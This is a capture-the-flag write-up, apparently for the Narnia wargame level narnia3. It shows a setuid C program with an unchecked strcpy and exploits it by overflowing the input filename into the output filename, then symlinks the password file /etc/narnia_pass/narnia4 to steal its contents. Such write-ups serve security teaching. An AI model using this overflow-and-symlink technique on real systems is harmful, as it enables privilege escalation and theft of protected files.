+++
title = "Narnia3"
date = "2026-03-10T16:02:35Z"
author = "0x4ngk4n"
draft = false
+++

Onto narnia3.. Its listing is as follows:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){

    int  ifd,  ofd;
    char ofile[16] = "/dev/null";
    char ifile[32];
    char buf[32];

    if(argc != 2){
        printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
        exit(-1);
    }

    /* open files */
    strcpy(ifile, argv[1]);
    if((ofd = open(ofile,O_RDWR)) < 0 ){
        printf("error opening %s\n", ofile);
        exit(-1);
    }
    if((ifd = open(ifile, O_RDONLY)) < 0 ){
        printf("error opening %s\n", ifile);
        exit(-1);
    }

    /* copy from file1 to file2 */
    read(ifd, buf, sizeof(buf)-1);
    write(ofd,buf, sizeof(buf)-1);
    printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);

    /* close 'em */
    close(ifd);
    close(ofd);

    exit(1);
}
```

The program takes in one argument, supposedly a file and copies it to `/dev/null`. I wish it didnt copy it to `/dev/null`. I observe that it is `ifile` which is copied into from argv[1] via a `strcpy`. Additionally, note the `ofile` declared just above `ifile` is set to `/dev/null`. 

Let's check normal execution of the binary first.

```shell
narnia3@narnia:~$ /narnia/narnia3 /etc/narnia_pass/narnia4
copied contents of /etc/narnia_pass/narnia4 to a safer place... (/dev/null)
```
The binary checks if the source file exists (if not throws error) and then checks if the destination file exists (throws error if not) and then copies the contents from source and writes to destination.
 
From the source code, it would seem that the variable `ifile` can be overflowed and the way it overflows is that it bleeds into `ofile`. That means we can actually control the destination instead of `/dev/null` (as in variables resident in memory are stack adjacent). This is tested by the following experimentation.

First we prepare the source and destination files
```shell
narnia3@narnia:~$ rm /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa
narnia3@narnia:~$ mkdir -p /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp/ <- the last `/tmp/` exceeds the 32 byte buffer length and is overflowed.
narnia3@narnia:~$ touch /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp/bbb <- create an overflowed size `ifile` which exists. Here the part `/tmp/bbb` is overflowed to `ofile`
narnia3@narnia:~$ echo "aaa" > /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp/bbb
narnia3@narnia:~$ cat /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp/bbb
aaa
narnia3@narnia:~$ touch /tmp/bbb <- the overflowed and overwritten `ofile` entry 
narnia3@narnia:~$ cat /tmp/bbb
narnia3@narnia:~$ <- notice the file `/tmp/bbb` is empty
```

```shell
narnia3@narnia:~$ /narnia/narnia3 /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp/bbb
copied contents of /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp/bbb to a safer place... (/tmp/bbb)
narnia3@narnia:~$ cat /tmp/bbb
aaa <- see how this file is now filled with "aaa"
```

Now we know we can control the destination but the need is to copy from a relevant source which is the next level password. And with character length control of a filename we can only create resources in the `/tmp` directory. Given this constraint and the set uid bit on the binary with the next level `narnia4` perms, we can have a symlinked file `/tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp/bbb` which points to `/etc/narnia_pass/narnia4`.

```shell
narnia3@narnia:~$ rm /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp/bbb <- deleting previously created regular file
narnia3@narnia:~$ ln -s /etc/narnia_pass/narnia4 /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp/bbb
narnia3@narnia:~$ ls -al /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp/bbb
lrwxrwxrwx 1 narnia3 narnia3 24 Mar 10 19:59 /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp/bbb -> /etc/narnia_pass/narnia4
narnia3@narnia:~$ /narnia/narnia3 /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp/bbb
copied contents of /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa/tmp/bbb to a safer place... (/tmp/bbb)
narnia3@narnia:~$ cat /tmp/bbb
<redacted pass>
```

Done.
